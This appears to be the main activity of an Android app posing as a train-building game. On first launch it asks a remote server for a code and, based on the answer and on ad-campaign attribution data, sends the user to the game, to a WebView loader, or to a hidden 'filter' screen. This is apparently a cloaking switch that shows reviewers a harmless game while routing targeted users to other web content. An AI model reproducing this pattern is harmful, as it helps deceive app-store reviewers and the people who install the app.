package com.imayi.trainbuilder

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.imayi.trainbuilder.MainClassApp.Companion.AF_DEV_KEY
import com.imayi.trainbuilder.MainClassApp.Companion.C1
import com.imayi.trainbuilder.MainClassApp.Companion.CH
import com.imayi.trainbuilder.MainClassApp.Companion.D1
import com.imayi.trainbuilder.MainClassApp.Companion.linkAppsCheckPart1
import com.imayi.trainbuilder.MainClassApp.Companion.linkAppsCheckPart2
import com.imayi.trainbuilder.databinding.ActivityMainBinding
import com.imayi.trainbuilder.gameefolder.GamerActivityyyyy
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    var checker: String = "null"
    lateinit var jsoup: String

    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding ?: throw RuntimeException("ActivityMainBinding = null")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        jsoup = ""

        deePP(this)

        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {

            val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPref.getString(CH, "null")) {
                "2" -> {
                    Log.d("toto", "when (sharPref.getString(CH-2")
                    skipMe()
                }
                "3" -> {
                    Log.d("toto", "when (sharPref.getString(CH-3")
                    testWV()
                }

                else -> {
                    Log.d("toto", "when (sharPref.getString(else")
                    toTestGrounds()
                }
            }
            //второе включение
        } else {
            Log.d("toto", "от я тут на другому включенні")

            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()

            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(linkAppsCheckPart1+linkAppsCheckPart2)
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            when (checker) {
                "1" -> {
                    Log.d("toto", "от я тут в перевркі чекера - 1")
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afNullRecordedOrNotChecker(1500)
                }
                "2" -> {
                    Log.d("toto", "от я тут в перевркі чекера - 2")
                    skipMe()

                }
                "3" -> {
                    Log.d("toto", "от я тут в перевркі чекера - 3")
                    testWV()
                }
                "0" -> {
                    Log.d("toto", "от я тут в перевркі чекера - 0")
                    toTestGrounds()
                }
            }
        }
    }

    private suspend fun getCheckCode(link: String): String {
        Log.d("toto", "от я тут в getCheckCode - МейнАктивити")

        val url = URL(link)
        val oneStr = "1"
        val twoStr = "2"
        val testStr = "3"
        val activeStrn = "0"
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnection.inputStream.bufferedReader().readText()) {
                "2" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, twoStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    twoStr
                }
                "1" -> {
                    Log.d("jsoup status", text)
                    oneStr
                }
                "3" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, twoStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    testStr
                }
                else -> {
                    Log.d("jsoup status", "is null")
                    activeStrn
                }
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(C1, null)
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    toTestGrounds()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(C1, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()

            val dataGotten = data?.get("campaign").toString()

            Log.d("toto", "от я тут в conversionDataListener - c1 - dataGotten:${dataGotten}")

            editor.putString(C1, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {


            Log.d("toto", "от я тут в conversionData onConversionDataFail")

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    private fun toTestGrounds() {
        Log.d("toto", "от я тут в toTestGrounds")

        Intent(this, FilterMePleeeaseStrong::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun skipMe() {
        Intent(this, GamerActivityyyyy::class.java)
            .also { startActivity(it) }
        finish()
    }
    private fun testWV() {
        Intent(this, WeeeeebLoadingActivity::class.java)
            .also { startActivity(it) }
        finish()
    }
    fun deePP(context: Context) {
        Log.d("toto", "от я тут в deePP на самому початку")
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host
                Log.d("toto", "от я тут в deePP - D1 - params:${params.toString()}")


                editor.putString(D1, params.toString())
                editor.apply()
            }
            if (appLinkData == null) {

                Log.d("toto", "от я тут в deePP appLinkData == null")

            }
        }
    }






    override fun onDestroy() {
        _binding = null
        super.onDestroy()
    }
}